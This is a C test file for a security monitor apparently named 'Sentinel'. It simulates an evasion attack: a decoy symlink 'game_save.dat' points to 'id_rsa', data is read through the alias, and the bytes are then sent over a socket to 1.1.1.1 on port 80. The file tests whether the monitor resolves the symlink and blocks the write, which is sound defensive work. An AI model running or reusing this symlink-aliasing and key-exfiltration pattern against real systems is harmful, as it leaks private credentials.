/*
 * tests/evasion/dup_test.c
 * Scenario: The "Ultimate" Evasion
 * 1. Create a Symlink to hide the sensitive file (Path Aliasing)
 * 2. Read from the Symlink
 * 3. Use Duplicated FD to hide the data flow
 * 4. Exfiltrate
 */
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int main() {
    printf("[EVASION] Starting Ultimate Symlink + FD Evasion Attack...\n");

    // STEP 0: Create a "Decoy" Symlink
    // We link a safe-looking name to the sensitive file
    // "game_save.dat" -> "id_rsa"
    symlink("id_rsa", "game_save.dat");

    // STEP 1: Open the Symlink (The Trap)
    // Sentinel sees "game_save.dat". M3.3 MUST resolve this to "id_rsa".
    printf("[EVASION] Attempting to read via Symlink 'game_save.dat'...\n");
    int fd_secret = open("game_save.dat", O_RDWR);

    if (fd_secret < 0) {
        // If it failed, maybe id_rsa doesn't exist, let's create it for the test
        int f = open("id_rsa", O_CREAT|O_RDWR, 0600);
        write(f, "SECRET_KEY_DATA", 15);
        close(f);
        fd_secret = open("game_save.dat", O_RDWR); // Retry
    }

    char buf[128];
    read(fd_secret, buf, 10);
    printf("[EVASION] Sensitive data loaded via Symlink.\n");

    // STEP 2: The FD Evasion
    int sneaky_pipe = dup(1);
    write(sneaky_pipe, "[INTERNAL] Staging data via pipe...\n", 36);

    // STEP 3: Network Exfiltration
    printf("[EVASION] Attempting network exfiltration...\n");

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    inet_pton(AF_INET, "1.1.1.1", &server.sin_addr);

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    // THE TRIGGER
    ssize_t sent = write(sock, buf, 10);

    if (sent < 0) {
        printf("\n\033[1;32m[SUCCESS] Exfiltration blocked! (Symlink Resolved)\033[0m\n");
    } else {
        printf("\n\033[1;31m[FAIL] Data was exfiltrated! (Symlink tricked us)\033[0m\n");
    }

    // Cleanup
    close(fd_secret);
    close(sneaky_pipe);
    close(sock);
    unlink("game_save.dat"); // Remove the decoy
    return 0;
}